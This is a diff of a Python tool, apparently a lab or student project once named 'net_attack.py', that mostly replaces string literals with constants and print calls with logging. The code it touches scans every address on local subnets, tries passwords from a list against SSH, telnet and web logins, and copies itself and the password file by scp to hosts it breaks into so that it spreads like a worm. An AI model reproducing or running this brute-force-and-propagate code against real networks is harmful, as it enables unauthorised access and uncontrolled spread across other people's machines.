@@ -10,7 +10,7 @@ from scapy.sendrecv import sr
 from scapy.utils import subprocess, os
 from telnetlib import Telnet
 from time import sleep
-from paramiko import SSHClient, AutoAddPolicy, RejectPolicy
+from paramiko import SSHClient, RejectPolicy
 import logging
 import requests
 import strings
@@ -74,7 +74,7 @@ def assigning_values(arguments):
     :return target_username: The username that will be used for actions
     :return passwords_filename: The filename of the passwords file
     """
-    if "-t" in arguments:
+    if strings.ARGUMENT_IP_ADDRESS_FILENAME in arguments:
         ip_addresses_filename = \
             arguments[
                 arguments.index(strings.ARGUMENT_IP_ADDRESS_FILENAME) + 1]
@@ -168,7 +168,8 @@ def check_over_telnet(ip, port, username, password):
         tel.write((str(username) + strings.RETURN_OR_NEWLINE)
                   .encode(strings.ENCODE_ASCII))
         tel.read_until(strings.PASSWORD_PROMPT.encode(strings.ENCODE_ASCII))
-        tel.write((str(password) + strings.RETURN_OR_NEWLINE).encode("ascii"))
+        tel.write((str(password) + strings.RETURN_OR_NEWLINE)
+                  .encode(strings.ENCODE_ASCII))
         data = tel.read_until(strings.WELCOME_TO.encode(strings.ENCODE_ASCII),
                               timeout=4)
         if check_telnet_data(strings.WELCOME_TO, data):
@@ -223,10 +224,10 @@ def checking_arguments(arguments):
             return values[0], values[1], values[2], values[3]
 
         except RuntimeError:
-            logging.error("Failed assigning values (maybe null)")
+            logging.error(strings.FAILED_ASSIGNING_VALUES)
             gtfo_and_rtfm()
     else:
-        logging.error("Parameter misuse, check help text below")
+        logging.error(strings.PARAMETER_MISUSE)
         gtfo_and_rtfm()
 
 
@@ -247,13 +248,14 @@ def connect_ssh_client(ip, port, username, password):
         client.connect(hostname=str(ip), port=int(port),
                        username=str(username), password=str(password))
         client.close()
-        logging.info(strings.connection_status("SSH", ip, port, "Successful"))
+        logging.info(strings.connection_status(strings.SSH, ip, port,
+                                               strings.SUCCESSFUL))
         return True
 
     except RuntimeError:
         client.close()
-        logging.debug(strings.connection_status("SSH", ip, port,
-                                                "Unsuccessful"))
+        logging.debug(strings.connection_status(strings.SSH, ip, port,
+                                                strings.UNSUCCESSFUL))
         return False
 
 
@@ -270,23 +272,26 @@ def connect_telnet(ip, port, username, password):
     """
     try:
         tel = Telnet(host=ip, port=port, timeout=2)
-        tel.read_until("login:".encode("ascii"))
-        tel.write((str(username) + "\n").encode("ascii"))
-        tel.read_until("Password:".encode("ascii"))
-        tel.write((str(password) + "\n").encode("ascii"))
+        tel.read_until(strings.LOGIN_PROMPT.encode(strings.ENCODE_ASCII))
+        tel.write((str(username) + strings.RETURN_OR_NEWLINE)
+                  .encode(strings.ENCODE_ASCII))
+        tel.read_until(strings.PASSWORD_PROMPT.encode(strings.ENCODE_ASCII))
+        tel.write((str(password) + strings.RETURN_OR_NEWLINE)
+                  .encode(strings.ENCODE_ASCII))
 
-        data = tel.read_until("Welcome to".encode("ascii"), timeout=4)
-        logging.info(strings.connection_status("telnet", ip, port,
-                                               "Successful"))
-        if check_telnet_data("Welcome to", data):
+        data = tel.read_until(strings.WELCOME_TO.encode(strings.ENCODE_ASCII),
+                              timeout=4)
+        logging.info(strings.connection_status(strings.TELNET, ip, port,
+                                               strings.SUCCESSFUL))
+        if check_telnet_data(strings.WELCOME_TO, data):
             return True
-        logging.debug(strings.connection_status("telnet", ip, port,
-                                                "Unsuccessful"))
+        logging.debug(strings.connection_status(strings.TELNET, ip, port,
+                                                strings.UNSUCCESSFUL))
         return False
 
     except RuntimeError:
-        logging.debug(strings.connection_status("telnet", ip, port,
-                                                "Unsuccessful"))
+        logging.debug(strings.connection_status(strings.TELNET, ip, port,
+                                                strings.UNSUCCESSFUL))
         return False
 
 
@@ -306,10 +311,11 @@ def connect_web(ip, port, username, password):
         send_post_request_with_login(ip, port, username, password)
         attempt_succeeded = True
     except RuntimeError:
-        logging.debug(strings.connection_status("web", ip, port,
-                                                "Unsuccessful"))
+        logging.debug(strings.connection_status(strings.WEB, ip, port,
+                                                strings.UNSUCCESSFUL))
     if attempt_succeeded:
-        logging.info(strings.connection_status("web", ip, port, "Successful"))
+        logging.info(strings.connection_status(strings.WEB, ip, port,
+                                               strings.SUCCESSFUL))
     return attempt_succeeded
 
 
@@ -335,16 +341,16 @@ def cycle_through_subnet(ip_list, interface):
     :param interface: The interface on which each IP address is to be checked
     for a response
     """
-    interface_split = get_if_addr(interface).split(".")
+    interface_split = get_if_addr(interface).split(strings.FULL_STOP)
     last_byte = 0
     while last_byte < 256:
-        specific_address = str(interface_split[0]) + "." \
-                           + str(interface_split[1]) + "." \
-                           + str(interface_split[2]) + "." \
+        specific_address = str(interface_split[0]) + strings.FULL_STOP \
+                           + str(interface_split[1]) + strings.FULL_STOP \
+                           + str(interface_split[2]) + strings.FULL_STOP \
                            + str(last_byte)
         if not ip_list.__contains__(specific_address):
-            print("Adding " + str(specific_address) + " from interface "
-                  + str(interface) + "'s subnet.")
+            logging.info(strings.adding_address_to_interface(specific_address,
+                                                             interface))
             ip_list.append(specific_address)
         last_byte = last_byte + 1
     return ip_list
@@ -368,7 +374,7 @@ def file_not_exist(ip, port, username, password):
     :param password: Password being used as part of checking the file
     :return check_over_ssh(ip, port, username, password):
     """
-    if str(port) == "22":
+    if str(port) == strings.SSH_PORT:
         return check_over_ssh(ip, port, username, password)
 
     return check_over_telnet(ip, port, username, password)
@@ -381,11 +387,11 @@ def gathering_local_ips(ip_list):
     :param ip_list: The IPs for which we're fetching the subnets
     :return ip_list: The IP list with the newly found subnet addresses
     """
-    print("Fetching local interface list...")
+    logging.info(strings.FETCHING_LOCAL_INTERFACE_LIST)
     local_interfaces = get_if_list()
     for interface in local_interfaces:
-        if str(interface) != "lo":
-            (print("Fetching IPs for interface " + str(interface) + "..."))
+        if str(interface) != strings.LOOPBACK:
+            logging.info(strings.fetching_ips_for_interface(interface))
             ip_list.extend(cycle_through_subnet(ip_list, interface))
     return ip_list
 
@@ -411,15 +417,15 @@ def is_reachable_ip(ip):
     # ping_pkt = IP(dst=str(ip))/ICMP()
     # reply = sr(ping_pkt, timeout=1)[0]
     # if not reply:
-    #     print(str(ip) + " was not reachable.")
+    #     logging.debug(strings.ip_reachability(ip, False))
     #     return False
-    # print(ip + " was reachable.")
+    # logging.info(strings.ip_reachability(ip, True))
     # return True
-    command = ["ping", "-c", "1", str(ip)]
+    command = [strings.PING, strings.PING_ARGUMENT, strings.ONE, str(ip)]
     if subprocess.call(command) == 0:
-        print(str(ip) + " was reachable.")
+        logging.info(strings.ip_reachability(ip, True))
         return True
-    print(str(ip) + " was not reachable.")
+    logging.debug(strings.ip_reachability(ip, False))
     return False
 
 
@@ -443,12 +449,13 @@ def propagate_script(ip, port, login_string):
     try:
         if file_not_exist(ip, port, login_string_split[0],
                           login_string_split[1]):
-            if str(port) == "22":
-                print("Please type in this password below and say yes to any"
-                      + " RSA key prompts: ")
-                os.system("scp -P " + str(port) + " net_attack.py "
+            if str(port) == strings.SSH_PORT:
+                # TODO: Need feedback from the end user, should be worked into
+                #  the UI itself.
+                print(strings.RSA_AND_PASSWORD)
+                os.system("scp -P " + str(port) + " net_propagation.py "
                           + login_string_split[0] + "@" + ip + ":~/")
-                print("Please type in this password again: ")
+                print(strings.PLEASE_TYPE_PASSWORD_AGAIN)
                 os.system("scp -P " + str(port) + " passwords.txt "
                           + login_string_split[0] + "@" + ip + ":~/")
                 client = SSHClient()
